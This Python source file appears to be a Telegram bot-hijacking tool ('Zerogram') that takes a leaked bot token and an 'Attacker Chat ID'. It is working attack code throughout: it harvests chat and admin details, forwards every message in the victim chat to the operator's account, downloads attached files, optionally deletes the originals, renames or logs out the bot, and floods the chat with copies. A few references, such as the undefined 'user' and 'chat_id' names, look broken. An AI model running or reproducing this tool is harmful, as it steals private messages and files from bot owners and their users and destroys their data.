import requests
import asyncio
import os
import threading
import time
from telethon import TelegramClient
from dotenv import load_dotenv
import argparse


env_api_id = 0
env_api_hash = ""
env_phone_number = ""


def read_secret(name: str) -> str:
    path = f"/secrets/{name}"
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        raise RuntimeError(f"Secret {name} not found at {path}")


try:
    env_api_id = read_secret("TELEGRAM_API_ID")
    env_api_hash = read_secret("TELEGRAM_API_HASH")
    env_phone_number = read_secret("TELEGRAM_PHONE")
except RuntimeError:
    load_dotenv()

    env_api_id = os.getenv("TELEGRAM_API_ID", "0")
    env_api_hash = os.getenv("TELEGRAM_API_HASH", "")
    env_phone_number = os.getenv("TELEGRAM_PHONE", "")


api_id = int(env_api_id) if env_api_id.isdigit() else 0
phone_number = env_phone_number

client = TelegramClient("anon_session", api_id,
                        env_api_hash, app_version="9.4.0")


TELEGRAM_API_URL = "https://api.telegram.org/bot"
TELEGRAM_API_FILE_URL = "https://api.telegram.org/file/bot"
DEFAULT_MESSAGE = """ID: 203132675, Method: license, Input: 5870174"""


class Zerogram:
    def __init__(self, token: str, chat_id: str, msg_id: int = 0, download_files: bool = False):
        self.bot_token = token
        self.chatid_entry = chat_id
        self.download_files = download_files
        self.bot_username = None
        self.my_chat_id = None
        self.last_message_id = None
        self.current_msg_id = msg_id
        self.users = set()
        self.session = requests.Session()

    def save_message_to_file(self, chat_id: str, message: str) -> bool:
        if message:
            os.makedirs(f"messages/{self.bot_username}", exist_ok=True)

            token = self.bot_token.split(
                ":")[0] if self.bot_token else "unknown"
            filename = os.path.join(
                f"messages/{self.bot_username}", f"bot_{token}_chat_{chat_id}.txt")

            if not os.path.exists(filename):
                bot_info = self.get_bot_info(self.bot_token)
                chat_type = bot_info.get('chat_type', '')
                chat_member_count = bot_info.get('chat_member_count', 0)
                invite_link = bot_info.get('invite_link', None)
                name = bot_info.get('name', '')
                username = bot_info.get('username', '')
                admin_id = bot_info.get('admin_id', None)
                admin_name = bot_info.get('admin_name', '')
                admin_username = bot_info.get('admin_username', '')
                language_code = bot_info.get('language_code', '')

                try:
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write("┌──────────────────────────────┐\n")
                        f.write("│        BOT INFORMATION       │\n")
                        f.write("├──────────────────────────────┤\n")
                        f.write(f"│ Bot Token        : {self.bot_token}\n")
                        f.write(f"│ Bot Username     : @{self.bot_username}\n")
                        f.write(f"│ Chat ID          : {chat_id}\n")
                        f.write(
                            f"│ Last Message ID  : {self.last_message_id}\n")

                        if name or username:
                            full_name = f"{name} (@{username})".strip(
                            )
                            f.write(f"│ Chat With        : {full_name}\n")
                        if chat_type:
                            f.write(f"│ Chat Type        : {chat_type}\n")
                            f.write(f"│ Admin ID         : {admin_id}\n")
                            f.write(
                                f"│ Admin Name       : {admin_name} (@{admin_username})\n")
                            f.write(f"│ Admin Language   : {language_code}\n")
                        if chat_member_count:
                            f.write(
                                f"│ Members in Chat  : {chat_member_count}\n")
                        if invite_link:
                            f.write(f"│ Invite Link      : {invite_link}\n")
                        f.write("└──────────────────────────────┘\n\n")
                except Exception as e:
                    print(f"[-] Error creating file header: {e}")
                    return False

            try:
                with open(filename, "a", encoding="utf-8") as f:
                    f.write(
                        f"\n--- Message ID: {message['message_id']} ---\n")
                    f.write(f"Date: {message['date']}\n")
                    if message['sender_name'] and message['sender_name'] != "Unknown":
                        f.write(f"Sender: {message['sender_name']}\n")
                    if message['text']:
                        f.write(f"Text: {message['text']}\n")
                    if message['caption']:
                        f.write(f"Caption: {message['caption']}\n")
                    if message['file_id']:
                        f.write(f"File ID: {message['file_id']}\n")
                    if message.get("file_name"):
                        f.write(f"File Name: {message['file_name']}\n")
                    if message.get("file_type"):
                        f.write(f"File Type: {message['file_type']}\n")
                    if message.get("file_caption"):
                        f.write(f"File Caption: {message['file_caption']}\n")
                    f.write("----------------------------------------\n")

                return True
            except Exception as e:
                print(f"[-] Save to file error: {e}")
                return False

        return False

    def parse_bot_token(self, raw_token: str) -> str:
        raw_token = raw_token.strip()
        if raw_token.lower().startswith("bot"):
            raw_token = raw_token[3:]
        return raw_token

    def get_bot_info(self, bot_token: str) -> dict:
        info = {}
        bot_id = None

        try:
            r = requests.get(f"{TELEGRAM_API_URL}{bot_token}/getMe")
            data = r.json()
            if data.get("ok"):
                response = data["result"]

                bot_id = response.get("id")

                info['bot_id'] = bot_id
                info['bot_name'] = response.get("first_name")
                info['bot_username'] = response.get("username")
            else:
                print(f"[getMe] Error: {data}")

            r = requests.get(
                f"{TELEGRAM_API_URL}{bot_token}/getChatMemberCount", params={"chat_id": self.chatid_entry})
            count_data = r.json()
            if count_data.get("ok"):
                info['chat_member_count'] = count_data.get("result", 0)
            else:
                print(
                    f"[getChatMemberCount] Error getting chat member count: {count_data}")

            r = requests.get(
                f"{TELEGRAM_API_URL}{bot_token}/getChat", params={"chat_id": self.chatid_entry})
            chat_data = r.json()

            if chat_data.get("ok"):
                chat_info = chat_data.get("result", {})
                if chat_info:
                    chat_type = chat_info.get("type", "")
                    info['chat_type'] = chat_type

                    if chat_type in ["group", "supergroup", "channel"]:
                        info['invite_link'] = chat_info.get("invite_link", "")
                    elif chat_type == "private":
                        info['name'] = f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(
                        )
                        info['username'] = chat_info.get("username", "")

            if info['chat_type'] in ["group", "supergroup", "channel"]:
                r = requests.get(
                    f"{TELEGRAM_API_URL}{bot_token}/getChatAdministrators", params={"chat_id": self.chatid_entry})
                admin_data = r.json()
                if admin_data.get("ok"):
                    results = admin_data.get("result", [])
                    if results:
                        admin_data = results[-1]
                        user = admin_data["user"]
                        if user:
                            info['admin_id'] = user.get("id")
                            info['admin_name'] = f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(
                            )
                            info['admin_username'] = user.get("username", "")
                            info['language_code'] = user.get(
                                "language_code", "")
                else:
                    print(
                        f"[getChatAdministrators] Error getting chat administrators: {admin_data}")

        except Exception as e:
            print(f"[getMe] Request error: {e}")

        return info

    async def telethon_send_start(self, bot_username: str) -> None:
        try:
            await client.start(phone_number)
            print("[+] [Telethon] Logged in with your account.")

            if not bot_username.startswith("@"):
                bot_username = "@" + bot_username
            await client.send_message(bot_username, "/start")

            print(f"[+] [Telethon] '/start' sent to {bot_username}.")
            await asyncio.sleep(2)
        except Exception as e:
            print(f"[-] [Telethon] Send error: {e}")

    def get_message_content(self, message_id, content):
        try:
            if content.get("ok"):
                message = content["result"]

                forward_origin = message.get("forward_origin")
                sender_name = None

                if forward_origin:
                    if forward_origin.get("type") == "user":
                        user = forward_origin.get("sender_user")
                        sender_name = user.get("first_name")
                        if user.get("last_name"):
                            sender_name += f" {user.get('last_name')}"
                        self.users.add(sender_name)
                    elif forward_origin.get("type") == "hidden_user":
                        sender_name = forward_origin.get("sender_user_name")
                        self.users.add(sender_name)
                    elif forward_origin.get("type") == "chat":
                        sender_name = forward_origin.get("sender_chat")
                    elif forward_origin.get("type") == "channel":
                        sender_name = forward_origin.get("chat").get("title")

                content = {
                    "message_id": message_id,
                    "chat_id": chat_id,
                    "date": message.get("date"),
                    "text": message.get("text", ""),
                    "sender_name": sender_name if sender_name else "Unknown",
                    "caption": message.get("caption", ""),
                    "file_id": None
                }

                media_types = ["photo", "document",
                               "video", "audio", "voice", "sticker"]
                for media_type in media_types:
                    if media_type in message:
                        if isinstance(message[media_type], list):
                            content["file_id"] = message[media_type][-1].get(
                                "file_id")
                            content["file_name"] = message[media_type][-1].get(
                                "file_name", None)
                        else:
                            content["file_id"] = message[media_type].get(
                                "file_id")
                            content["file_name"] = message[media_type].get(
                                "file_name", None)

                        content["file_type"] = media_type
                        break

                return content
            return None
        except Exception as e:
            print(f"[-] Get message content error ID {message_id}: {e}")
            return None

    def async_save_message_content(self, bot_token: str, chat_id: str, message_id: str, content: dict = None):
        message_content = self.get_message_content(message_id, content)
        if message_content:
            file_id = message_content.get("file_id")
            if file_id and self.download_files:
                print(
                    f"[+] [Async] Downloading file for message ID {message_id}.")
                file_name = message_content.get("file_name", None)

                self.download_file(bot_token, file_id, file_name)

            success = self.save_message_to_file(chat_id, message_content)

            if success:
                print(f"[+] [Async] Saved message ID {message_id} to file.")
            else:
                print(f"[!] [Async] Failed to save message ID {message_id}.")
        else:
            print(
                f"[!] [Async] Failed to retrieve content for message ID {message_id}.")

    def forward_msg(self, bot_token: str, from_chat_id: str, to_chat_id: str, message_id: str, save_content: bool = True) -> bool:
        payload = {
            "from_chat_id": from_chat_id,
            "chat_id": to_chat_id,
            "message_id": message_id
        }

        try:
            r = self.session.post(
                f"{TELEGRAM_API_URL}{bot_token}/forwardMessage", json=payload)
            data = r.json()

            if data.get("ok"):
                print(f"[+] Forwarded message ID {message_id}.")

                if save_content:
                    threading.Thread(
                        target=self.async_save_message_content,
                        args=(bot_token, from_chat_id, message_id, data),
                        daemon=True
                    ).start()

                return True
            else:
                print(f"[!] Forward fail ID {message_id}")

                self.fail_msg_handler(data)

                return False
        except Exception as e:
            print(f"[-] Forward error ID {message_id}: {e}")
            return False

    def fail_msg_handler(self, msg: dict) -> str:
        if not msg.get("ok"):
            if msg.get("error_code") == 429:
                wait = msg.get("parameters", {}).get("retry_after", 0)

                if wait > 0:
                    print(
                        f"[-] Rate limit exceeded. Waiting for {wait} seconds ({wait // 60} minutes)...\nnow time: {time.strftime('%H:%M:%S', time.localtime())}")
                    time.sleep(wait)
                else:
                    print("[-] Rate limit exceeded. No wait time provided.")
            elif msg.get("error_code") == 400:
                print("[-] Bad request. Invalid parameters.")

    def download_file(self, bot_token, file_id: str, file_name: str) -> None:
        try:
            r = requests.get(
                f"{TELEGRAM_API_URL}{bot_token}/getFile", params={"file_id": file_id})
            data = r.json()

            if data.get("ok"):
                file_path = data["result"]["file_path"]
                file_url = f"{TELEGRAM_API_FILE_URL}{bot_token}/{file_path}"

                response = requests.get(file_url)
                if response.status_code == 200:
                    base_dir = f"messages/{self.bot_username}/files"
                    original_name = file_name if file_name else os.path.basename(
                        file_path)
                    name, ext = os.path.splitext(original_name)
                    filename = os.path.join(base_dir, original_name)

                    os.makedirs(os.path.dirname(filename), exist_ok=True)

                    counter = 1
                    while os.path.exists(filename):
                        new_name = f"{name}_{counter}{ext}"
                        filename = os.path.join(base_dir, new_name)
                        counter += 1

                    with open(filename, "wb") as f:
                        f.write(response.content)
                    print(f"[+] File downloaded: {filename}")
                else:
                    print(
                        f"[-] Failed to download file: {response.status_code}")
            else:
                print(f"[-] Get file error: {data}")

        except Exception as e:
            print(f"[-] Download file error: {e}")

    def get_my_chat_id(self) -> str:
        try:
            r = requests.get(f"{TELEGRAM_API_URL}{self.bot_token}/getUpdates")
            data = r.json()

            if data.get("ok") and data.get("result"):
                last_update = data["result"][-1]
                if "message" in last_update:
                    return str(last_update["message"]["chat"]["id"])

            else:
                print(f"[-] Get updates error: {data}")

        except Exception as e:
            print(f"[-] Get my chat ID error: {e}")

        return None

    def initialize(self) -> bool:
        raw_token = self.bot_token.strip()
        if not raw_token:
            print("[!] Bot Token cannot be empty!")
            return False

        parsed_token = self.parse_bot_token(raw_token)
        bot_info = self.get_bot_info(parsed_token)

        bot_id = bot_info.get('bot_id')
        bot_name = bot_info.get('bot_name')
        bot_user = bot_info.get('bot_username')
        chat_member_count = bot_info.get('chat_member_count', 0)
        invite_link = bot_info.get('invite_link', None)
        name = bot_info.get('name', '')
        username = bot_info.get('username', '')

        if not bot_id or not bot_name or not bot_user or not chat_member_count:
            print("[!] get_bot_info failed or not a valid bot token!")
            return False

        self.bot_token = parsed_token
        self.bot_username = bot_user

        last_message_id = self.get_last_message_id()

        if not last_message_id:
            print("[!] Failed to get last message ID!")
            return False

        self.last_message_id = last_message_id
        invite_line = f"║ Invite Link      : {invite_link}\n" if invite_link is not None else ""
        chat_with_line = f"║ Chat With        : {name} (@{username})\n" if name or username else ""

        info_msg = (
            f"╔══════════ BOT STATUS ══════════╗\n"
            f"║ Bot Username     : @{bot_user}\n"
            f"║ Attacker Chat ID : {self.chatid_entry}\n"
            f"║ Chat Member Count: {chat_member_count}\n"
            f"{invite_line}"
            f"{chat_with_line}"
            f"║ Last Message ID  : {last_message_id}\n"
            f"╚════════════════════════════════╝"
        )

        print(info_msg)
        return True

    def start(self, delete_messages: bool = False) -> None:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.telethon_send_start(self.bot_username))

        self.my_chat_id = self.get_my_chat_id()
        if not self.my_chat_id:
            print("[!] Failed to get my chat ID!")
            return

        if self.current_msg_id > 0:
            print(f"Starting from message ID {self.current_msg_id}")

        self.forward_all_messages(
            attacker_chat_id=self.chatid_entry, start_id=self.current_msg_id, delete=delete_messages)

    def forward_all_messages(self, attacker_chat_id: str, start_id: int = 0, delete: bool = False) -> None:
        if self.last_message_id is None:
            self.last_message_id = 0

        max_id = self.last_message_id
        success_count = 0

        for msg_id in range(start_id, max_id + 1):
            ok = self.forward_msg(
                self.bot_token, attacker_chat_id, self.my_chat_id, msg_id)
            if ok:
                success_count += 1
                if delete:
                    self.delete_message(attacker_chat_id, msg_id)

        txt = f"Forwarded from ID {start_id}..{max_id}, total success: {success_count}, total users: {len(self.users)}"

        print("[Result] " + txt.replace("\n", " | "))

    def send_message(self, chat_id: str, message: str = DEFAULT_MESSAGE) -> int:
        payload = {
            "chat_id": chat_id,
            "text": message
        }

        try:
            token = self.parse_bot_token(self.bot_token)

            r = requests.post(
                f"{TELEGRAM_API_URL}{token}/sendMessage", json=payload)

            data = r.json()

            if data.get("ok"):
                print(f"[+] Message sent to {chat_id}.")
                return data.get("result", {}).get("message_id", None)
            else:
                print(f"[-] Send message error: {data}")

        except Exception as e:
            print(f"[-] Send message error: {e}")

    def get_last_message_id(self) -> int:
        return self.send_message(self.chatid_entry)

    def delete_message(self, chat_id: str, message_id: int) -> None:
        payload = {
            "chat_id": chat_id,
            "message_id": message_id
        }

        try:
            if "bot" in self.bot_token.lower():
                self.bot_token = self.parse_bot_token(self.bot_token)

            r = requests.post(
                f"{TELEGRAM_API_URL}{self.bot_token}/deleteMessage", json=payload)
            data = r.json()

            if data.get("ok"):
                print(
                    f"[+] Deleted message ID {message_id} in chat {chat_id}.")
            else:
                print(f"[-] Delete message error: {data}")

        except Exception as e:
            print(f"[-] Delete message error: {e}")

    def delete_messages(self) -> None:
        chat_id = self.chatid_entry
        last_msg = self.get_last_message_id()

        if not chat_id or not last_msg:
            print("Error", "Chat ID or last message ID is empty!")
            return

        print(
            f"Deleting messages in chat {chat_id} starting from ID {last_msg}...")
        try:
            for msg_id in range(0, last_msg + 1):
                self.delete_message(chat_id, msg_id)

            print("All messages deleted successfully.")
        except Exception as e:
            print(f"[-] Error during message deletion: {e}")
            return

    def change_bot_name(self, new_name: str) -> None:
        payload = {
            "name": new_name
        }

        try:
            if "bot" in self.bot_token.lower():
                self.bot_token = self.parse_bot_token(self.bot_token)
            r = requests.post(
                f"{TELEGRAM_API_URL}{self.bot_token}/setMyName", json=payload)
            data = r.json()

            if data.get("ok"):
                print(f"[+] Bot name changed to {new_name}.")
            else:
                print(f"[-] Change bot name error: {data}")

        except Exception as e:
            print(f"[-] Change bot name error: {e}")

    def send_file(self, file_path: str) -> None:
        chat_id = self.chatid_entry.strip()
        file_type = "document"

        if file_path.lower().endswith((".jpg", ".jpeg", ".png")):
            file_type = "photo"
        elif file_path.lower().endswith((".mp4", ".avi", ".mov")):
            file_type = "video"
        elif file_path.lower().endswith((".mp3", ".wav")):
            file_type = "audio"
        elif file_path.lower().endswith(".ogg"):
            file_type = "voice"
        elif file_path.lower().endswith((".gif", ".webp")):
            file_type = "animation"
        else:
            print(
                "[-] Unsupported file type. Supported types: document, photo, audio, video, animation, voice.")
            return

        file_type_methods = {
            'document': 'sendDocument',
            'photo': 'sendPhoto',
            'audio': 'sendAudio',
            'video': 'sendVideo',
            'animation': 'sendAnimation',
            'voice': 'sendVoice',
            'video_note': 'sendVideoNote'
        }

        with open(file_path, 'rb') as file:
            files = {
                file_type: file
            }

            message = input(
                "Enter a caption for the file (optional): ").strip()

            payload = {
                'chat_id': chat_id,
                'caption': message
            }

            try:
                if "bot" in self.bot_token.lower():
                    self.bot_token = self.parse_bot_token(self.bot_token)

                r = requests.post(
                    f"{TELEGRAM_API_URL}{self.bot_token}/{file_type_methods[file_type]}",
                    files=files, data=payload
                )
                data = r.json()

                if data.get("ok"):
                    print(f"[+] File sent successfully to {chat_id}.")
                else:
                    print(f"[-] Send file error: {data}")

            except Exception as e:
                print(f"[-] Send file error: {e}")

    def logout(self) -> None:
        try:
            if "bot" in self.bot_token.lower():
                self.bot_token = self.parse_bot_token(self.bot_token)
            r = requests.get(f"{TELEGRAM_API_URL}{self.bot_token}/logOut")
            data = r.json()
            if data.get("ok"):
                print("[+] Successfully logged out.")
            else:
                print(f"[-] Logout error: {data}")
        except Exception as e:
            print(f"[-] Logout error: {e}")

    def leave_chat(self, chat_id: str) -> None:
        try:
            if "bot" in self.bot_token.lower():
                self.bot_token = self.parse_bot_token(self.bot_token)
            r = requests.post(
                f"{TELEGRAM_API_URL}{self.bot_token}/leaveChat", json={"chat_id": chat_id})
            data = r.json()
            if data.get("ok"):
                print(f"[+] Successfully left chat {chat_id}.")
            else:
                print(f"[-] Leave chat error: {data}")
        except Exception as e:
            print(f"[-] Leave chat error: {e}")

    def copy_message(self, from_chat_id: str, to_chat_id: str, message_id: int) -> None:
        payload = {
            "from_chat_id": from_chat_id,
            "chat_id": to_chat_id,
            "message_id": message_id
        }

        try:
            if "bot" in self.bot_token.lower():
                self.bot_token = self.parse_bot_token(self.bot_token)

            r = requests.post(
                f"{TELEGRAM_API_URL}{self.bot_token}/copyMessage", json=payload)
            data = r.json()

            if data.get("ok"):
                print(f"[+] Copied message ID {message_id}.")
            else:
                print(f"[!] Copy message fail ID: {message_id}")
                self.fail_msg_handler(data)

        except Exception as e:
            print(f"[-] Copy message error: {e}")

    def flood(self, count, message) -> None:
        message_id = self.send_message(self.chatid_entry, message)

        count_lock = threading.Lock()

        def copy_loop(message_id):
            nonlocal count
            while True:
                with count_lock:
                    if count <= 0:
                        break
                    count -= 1

                self.copy_message(self.chatid_entry,
                                  self.chatid_entry, message_id)

        def forward_loop(message_id):
            nonlocal count
            while True:
                with count_lock:
                    if count <= 0:
                        break
                    count -= 1

                self.forward_msg(self.bot_token, self.chatid_entry,
                                 self.chatid_entry, message_id, save_content=False)

        th1 = threading.Thread(
            target=copy_loop, args=(message_id,), daemon=True)
        th2 = threading.Thread(
            target=forward_loop, args=(message_id,), daemon=True)

        th1.start()
        th2.start()

        th1.join()
        th2.join()


def parse_args():
    parser = argparse.ArgumentParser(
        description="Telegram Bot Forwarder (Telebof)")
    parser.add_argument("-t", "--token", type=str, required=True,
                        help="Bot Token")
    parser.add_argument("-c", "--chatid", type=str, required=True,
                        help="Attacker Chat ID")
    parser.add_argument("-df", "--download_files", action="store_true",
                        help="Download files sent to the bot chat")
    parser.add_argument("-mi", "--msg_id", type=int, default=0,
                        help="Starting Message ID (default: 0)")
    parser.add_argument("-sm", "--send_msg", type=str, default="",
                        help="Message to send to the attacker chat ID")
    parser.add_argument("-d", "--delete_messages", action="store_true",
                        help="Delete all messages in the bot chat")
    parser.add_argument("-sn", "--set_name", type=str, default="",
                        help="Set a new name for the bot")
    parser.add_argument("-f", "--file", type=str, default="",
                        help="File to send to the attacker chat ID")
    parser.add_argument("-l", "--logout", action="store_true",
                        help="leave the chat and log out the bot")
    parser.add_argument("-fl", "--flood", type=int, default=0,
                        help="Flood messages")
    return parser.parse_args()


def print_banner():
    banner = """
/$$$$$$$$                                                                          
|_____ $$                                                                           
     /$$/   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
    /$$/   /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ |____  $$| $$_  $$_  $$
   /$$/   | $$$$$$$$| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/  /$$$$$$$| $$ \ $$ \ $$
  /$$/    | $$_____/| $$      | $$  | $$| $$  | $$| $$       /$$__  $$| $$ | $$ | $$
 /$$$$$$$$|  $$$$$$$| $$      |  $$$$$$/|  $$$$$$$| $$      |  $$$$$$$| $$ | $$ | $$
|________/ \_______/|__/       \______/  \____  $$|__/       \_______/|__/ |__/ |__/
                                         /$$  \ $$                                  
                                        |  $$$$$$/                                  
                                         \______/                                   
    """
    print(banner)


if __name__ == "__main__":
    args = parse_args()

    print_banner()

    if not args.token or not args.chatid:
        print("Error", "Bot Token and Chat ID cannot be empty!")
        exit(1)

    token = args.token.strip()
    chat_id = args.chatid.strip()
    download_files = args.download_files
    start_id = args.msg_id if args.msg_id > 0 else 0
    send_msg = args.send_msg.strip()
    delete_messages = args.delete_messages
    set_name = args.set_name.strip()
    file_to_send = args.file.strip()
    logout = args.logout
    flood = args.flood if args.flood > 0 else 0

    bot = Zerogram(token, chat_id, msg_id=start_id,
                   download_files=download_files)

    if flood > 0 and send_msg:
        print(f"[*] Flooding {flood} messages...")
        bot.flood(flood, send_msg)
        exit(0)
    elif flood > 0 and not send_msg:
        print("[!] Flooding requires a message to send.")
        exit(1)

    if send_msg:
        bot.send_message(chat_id, send_msg)

        exit(0)

    if delete_messages:
        bot.delete_messages()
        exit(0)

    if set_name:
        bot.change_bot_name(set_name)
        exit(0)

    if file_to_send:
        bot.send_file(file_to_send)
        exit(0)

    if logout:
        print("[*] Leaving chat...")
        bot.leave_chat(chat_id)

        print("[*] Logging out the bot...")
        bot.logout()

        exit(0)

    if bot.initialize():
        delete_messages = input(
            "Delete the messages after forwarding? (y/n): ").strip().lower() == 'y'

        bot.start(delete_messages=delete_messages)
